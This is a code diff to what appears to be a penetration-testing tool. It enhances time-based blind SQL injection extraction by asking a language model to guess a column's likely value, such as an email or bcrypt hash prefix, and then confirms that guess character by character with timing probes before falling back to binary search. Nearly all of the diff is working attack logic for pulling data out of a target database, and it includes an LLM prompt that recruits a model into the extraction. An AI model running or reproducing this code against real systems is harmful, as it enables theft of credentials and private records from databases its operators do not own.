@@ -88,9 +88,45 @@ def _is_true_timing(r, baseline_ms, delay_seconds):
     return r.get("elapsed_ms", 0.0) >= baseline_ms + delay_seconds * 1000 * 0.5
 
 
+def _llm_extract_prior(table, column, dbms, context=None):
+    try:
+        from . import llm_service
+        client = llm_service.get_client("blind_extract")
+    except Exception:
+        return ""
+    if client is None:
+        return ""
+    import json as _json
+    import re as _re
+    prompt = (
+        "You guide a blind SQL extraction during an authorized security test. "
+        "Given the table and column being extracted, output ONLY a JSON object "
+        '{"guess": "..."} with your single best guess for the value (common '
+        "format for this column kind, e.g. an email, a bcrypt prefix, a UUID). "
+        "No prose.\n\n"
+        + _json.dumps({"table": table, "column": column, "dbms": dbms,
+                       "context": context or {}}, default=str)[:2000]
+        + "\n\nRespond with JSON only."
+    )
+    try:
+        raw = client(prompt)
+    except Exception:
+        return ""
+    txt = (raw or "").strip()
+    m = _re.search(r"\{.*\}", txt, _re.S)
+    if m:
+        txt = m.group(0)
+    try:
+        data = _json.loads(txt)
+    except Exception:
+        return ""
+    g = data.get("guess") if isinstance(data, dict) else ""
+    return str(g)[:64] if isinstance(g, str) else ""
+
+
 def extract_string(url, param, table, column, dbms="mysql", method="GET",
                    headers=None, timeout=15, delay_seconds=4, max_length=64,
-                   max_requests=400, roe_guard=None, verify=None):
+                   max_requests=400, roe_guard=None, verify=None, prior=None):
     if verify is None:
         verify = _verify_tls()
     template_key = dbms + "_time"
@@ -98,6 +134,16 @@ def extract_string(url, param, table, column, dbms="mysql", method="GET",
     if not template:
         return {"extracted": "", "requests": 0,
                 "error": f"no template for dbms {dbms}"}
+
+    if prior is None:
+        prior = _llm_extract_prior(table, column, dbms)
+
+    def _probe(pos, char):
+        return _send(url, param,
+                     template.format(column=column, table=table,
+                                     pos=pos, char=char, delay=delay_seconds),
+                     method, headers, timeout + delay_seconds + 3,
+                     verify, roe_guard)
 
     out = ""
     requests_made = 0
@@ -111,6 +157,25 @@ def extract_string(url, param, table, column, dbms="mysql", method="GET",
     for pos in range(1, max_length + 1):
         if requests_made >= max_requests:
             break
+        guess = prior[pos - 1] if (prior and pos - 1 < len(prior)) else None
+        if (guess is not None and 32 <= ord(guess) <= 126
+                and requests_made + 2 <= max_requests):
+            c = ord(guess)
+            r1 = _probe(pos, c - 1)
+            requests_made += 1
+            t1 = _is_true_timing(r1, baseline_ms, delay_seconds)
+            if t1 is None:
+                return {"extracted": out, "requests": requests_made,
+                        "error": r1.get("error", "unknown")}
+            r2 = _probe(pos, c)
+            requests_made += 1
+            t2 = _is_true_timing(r2, baseline_ms, delay_seconds)
+            if t2 is None:
+                return {"extracted": out, "requests": requests_made,
+                        "error": r2.get("error", "unknown")}
+            if t1 and not t2:
+                out += guess
+                continue
         low, high = 32, 126
         while low < high:
             mid = (low + high) // 2
